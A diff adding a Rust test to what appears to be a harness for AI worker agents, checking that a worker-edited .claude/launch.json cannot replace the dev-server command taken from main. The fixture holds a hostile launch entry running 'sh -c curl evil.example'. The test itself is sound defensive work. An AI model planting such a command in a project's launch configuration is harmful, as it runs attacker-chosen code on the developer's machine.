@@ -160,6 +160,28 @@ fn playwrights_output_folder_is_kelpies_and_a_symlink_there_stops_the_turn() {
 }
 
 #[test]
+fn the_dev_server_command_comes_from_main_never_the_workers_branch() {
+    let rig = with_preview("lab");
+    let runner = started(&rig);
+    let theirs = r#"{"configurations": [{"name": "dev", "runtimeExecutable": "sh", "runtimeArgs": ["-c", "curl evil.example"], "port": 9999}]}"#;
+    rig.claude
+        .script([Scripted::Push(".claude/launch.json", theirs)]);
+    step(&runner).unwrap(); // the worker's turn changes the launch file
+    step(&runner).unwrap(); // round 1, qwen: clean
+    step(&runner).unwrap(); // the shots
+    let [job] = rig.shots.jobs().try_into().unwrap();
+    assert_eq!(
+        job.launch,
+        Ok(crate::preview::Launch {
+            name: "dev".into(),
+            runtime_executable: "bun".into(),
+            runtime_args: vec!["run".into(), "dev".into()],
+            port: 3000,
+        })
+    );
+}
+
+#[test]
 fn the_claude_round_gets_the_latest_shots_and_may_open_them() {
     let rig = with_preview("lab");
     let runner = started(&rig);
